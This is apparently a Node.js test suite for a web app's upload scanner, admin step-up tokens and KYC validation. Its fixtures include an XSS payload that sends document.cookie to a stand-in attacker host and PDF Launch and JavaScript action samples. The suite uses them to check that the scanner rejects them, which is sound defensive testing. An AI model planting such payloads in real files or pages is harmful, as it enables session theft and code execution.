import assert from "node:assert/strict";
import test from "node:test";
import {
  detectFileTypeFromMagicBytes,
  scanFileForMaliciousContent,
  validateUploadedFileSafety,
} from "@/lib/file-security";
import {
  generateStepUpToken,
  verifyStepUpToken,
} from "@/modules/admin/services/admin-step-up.service";
import { hostKycSchema } from "@/modules/host/services/host-kyc.service";

test("File Security: correctly identifies valid binary magic bytes", () => {
  // JPEG
  const jpegBuffer = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
  assert.deepEqual(detectFileTypeFromMagicBytes(jpegBuffer), { mime: "image/jpeg", ext: "jpg" });

  // PNG
  const pngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
  assert.deepEqual(detectFileTypeFromMagicBytes(pngBuffer), { mime: "image/png", ext: "png" });

  // WebP
  const webpBuffer = Buffer.concat([
    Buffer.from("RIFF", "latin1"),
    Buffer.alloc(4),
    Buffer.from("WEBPVP8 ", "latin1"),
  ]);
  assert.deepEqual(detectFileTypeFromMagicBytes(webpBuffer), { mime: "image/webp", ext: "webp" });

  // PDF
  const pdfBuffer = Buffer.from("%PDF-1.7\n%\xe2\xe3\xcf\xd3\n");
  assert.deepEqual(detectFileTypeFromMagicBytes(pdfBuffer), { mime: "application/pdf", ext: "pdf" });

  // Unknown / plain text
  const textBuffer = Buffer.from("Hello world, this is a plain text file pretending to be an image");
  assert.equal(detectFileTypeFromMagicBytes(textBuffer), null);
});

test("File Security: detects and rejects MIME type spoofing", () => {
  const allowed = new Set(["image/jpeg", "image/png", "application/pdf"]);
  const textBuffer = Buffer.from("<html><title>Phishing Page</title></html>");

  // Plain text masquerading as image/jpeg
  const result = validateUploadedFileSafety(textBuffer, "image/jpeg", allowed);
  assert.equal(result.valid, false);
  if (!result.valid) {
    assert.equal(result.statusCode, 400);
    assert.match(result.error, /Unable to verify file type from binary header/);
  }

  // Real PNG binary claiming to be image/jpeg
  const pngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
  const mismatchResult = validateUploadedFileSafety(pngBuffer, "image/jpeg", allowed);
  assert.equal(mismatchResult.valid, false);
  if (!mismatchResult.valid) {
    assert.equal(mismatchResult.statusCode, 400);
    assert.match(mismatchResult.error, /MIME type mismatch/);
  }
});

test("File Security: blocks malware binaries, executable headers, and script injections", () => {
  // Windows MZ header disguised as PNG
  const mzFakePng = Buffer.concat([
    Buffer.from([0x4d, 0x5a]), // MZ header
    Buffer.from("This program cannot be run in DOS mode"),
  ]);
  const mzScan = scanFileForMaliciousContent(mzFakePng, "image/png");
  assert.equal(mzScan.safe, false);
  assert.match(mzScan.reason || "", /Windows executable/);

  // Linux ELF header
  const elfFakePng = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
  const elfScan = scanFileForMaliciousContent(elfFakePng, "image/png");
  assert.equal(elfScan.safe, false);
  assert.match(elfScan.reason || "", /Linux ELF binary/);

  // SVG / Image with XSS payload
  const xssPayload = Buffer.from("GIF89a... <script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>");
  const xssScan = scanFileForMaliciousContent(xssPayload, "image/gif");
  assert.equal(xssScan.safe, false);
  assert.match(xssScan.reason || "", /Cross-site scripting/);
});

test("File Security: blocks dangerous PDF action dictionaries (/Launch, /JavaScript, /EmbeddedFiles)", () => {
  const dangerousPdf = Buffer.from("%PDF-1.4\n1 0 obj\n<< /Type /Action /S /Launch /F (calc.exe) >>\nendobj");
  const scanResult = scanFileForMaliciousContent(dangerousPdf, "application/pdf");
  assert.equal(scanResult.safe, false);
  assert.match(scanResult.reason || "", /Dangerous PDF action dictionary/);

  const jsPdf = Buffer.from("%PDF-1.4\n<< /JavaScript << /JS (app.alert('PWNED')) >> >>");
  const jsScanResult = scanFileForMaliciousContent(jsPdf, "application/pdf");
  assert.equal(jsScanResult.safe, false);
  assert.match(jsScanResult.reason || "", /Dangerous PDF action dictionary/);
});

test("Admin Step-Up Auth: issues and verifies tamper-evident HMAC step-up tokens", () => {
  const adminId = "admin-user-id-123";
  const token = generateStepUpToken(adminId, "admin@travelspro.in", 300);

  assert.ok(token.includes("."));
  assert.equal(verifyStepUpToken(token, adminId), true);

  // Mismatched adminId must be rejected
  assert.equal(verifyStepUpToken(token, "different-admin-id"), false);

  // Tampered token must be rejected
  const [dataPart, sigPart] = token.split(".");
  const tamperedToken = `${dataPart}.${sigPart.slice(0, -2)}aa`;
  assert.equal(verifyStepUpToken(tamperedToken, adminId), false);

  // Expired token must be rejected
  const expiredToken = generateStepUpToken(adminId, "admin@travelspro.in", -5);
  assert.equal(verifyStepUpToken(expiredToken, adminId), false);
});

test("Host KYC Schema: validates Indian PAN and Aadhaar formats correctly", () => {
  const baseValid = {
    firstName: "Rohan",
    lastName: "Verma",
    dateOfBirth: new Date("1994-05-15"),
    nationality: "Indian",
    idFrontImage: "kyc_docs/front_12345",
    idBackImage: "kyc_docs/back_12345",
    addressProof: "kyc_docs/address_12345",
    businessLicense: "",
    consentGiven: true,
  };

  // Valid Aadhaar
  const validAadhaar = hostKycSchema.safeParse({
    ...baseValid,
    idType: "aadhaar",
    idNumber: "5544 3322 1100",
  });
  assert.equal(validAadhaar.success, true);

  // Invalid Aadhaar (too short)
  const invalidAadhaar = hostKycSchema.safeParse({
    ...baseValid,
    idType: "aadhaar",
    idNumber: "12345",
  });
  assert.equal(invalidAadhaar.success, false);

  // Valid PAN
  const validPan = hostKycSchema.safeParse({
    ...baseValid,
    idType: "pan",
    idNumber: "ABCDE1234F",
  });
  assert.equal(validPan.success, true);

  // Invalid PAN
  const invalidPan = hostKycSchema.safeParse({
    ...baseValid,
    idType: "pan",
    idNumber: "12345ABCDE",
  });
  assert.equal(invalidPan.success, false);

  // Rejected when DPDP consent is explicitly false
  const noConsent = hostKycSchema.safeParse({
    ...baseValid,
    idType: "pan",
    idNumber: "ABCDE1234F",
    consentGiven: false,
  });
  assert.equal(noConsent.success, false);
});

